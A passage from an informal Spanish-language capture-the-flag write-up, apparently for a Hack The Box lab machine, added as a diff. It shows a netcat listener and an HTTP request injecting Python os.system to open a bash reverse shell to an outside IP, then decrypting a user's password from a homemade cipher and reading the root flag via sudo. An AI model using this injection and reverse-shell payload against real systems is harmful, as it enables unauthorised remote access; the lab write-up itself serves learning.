@@ -300,3 +300,64 @@ ya tenemos el archivo.py, que lleva esto como code:
                 status = "500"
             return {"body": data, "mime": mime, "status": status}
 ```
+
+el archivo me costo entenderlo, pero luego de un poco de ayuda logre cachar que esto explica que para el index.html se le pueden ingresar string que el sistema ejecuta como python, logrando asi introducir una reverse shell para entrar al system.
+
+meti la pag a un burp, luego hice la reverse shell.
+
+> nc -lvp 4443
+
+```vim
+GET /';os.system('bash%20-c%20"bash%20-i%20>&%20/dev/tcp/10.10.14.72/4443%200>&1"');a=' HTTP/1.1
+Host: 10.10.10.168:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+```
+
+listo, entre como www-data
+
+## Robert
+
+este paso culiao me costo muxo, tuve que leer el codigo y entender que hacia cada cosa.
+
+> SuperSecureCrypt.py​ - Este es un acrhivo.py que se usa para encriptar algun archivo o string que le envien
+>
+> check.txt​ - limpia el texto encryptado de un archivo out.txt que deja el .py anterior
+> 
+> out.txt​ - texto excriptado del clear text "check.txt"
+>
+> passwordreminder.txt​ - password encriptada del usuario robert
+
+Una mega paja wn. el tema es que puedes obtener la clave que usa para encriptar de la sgte manera.
+
+> python3 SuperSecureCrypt.py -d -k "Encrypting this file with your
+  key should result in out.txt, make sure your key is correct!" -i
+  out.txt -o /tmp/passwd.txt
+>
+> cat /tmp/passwd.txt
+>> alexandrovich
+>
+Ahora con esto podemos obtener lo demas:
+
+> python3 SuperSecureCrypt.py -d -k alexandrovich -i
+  passwordreminder.txt -o /tmp/robertpwd.txt
+>
+>> cat /tmp/robertpwd.txt
+>>> SecThruObsFTW
+
+El root es simple, le damos a un 
+
+> sudo -l
+ 
+y obtenemos un archivo que podemos usar como root, este archivo busca usuarios ingresados con priviliegos en el sistema.
+y nos pide las credenciales dle mismo, como "robert" es un usuario le di esas credenciales y me dejo usar:
+
+> sudo -u root cat /root/root.txt
+
+listowo :D
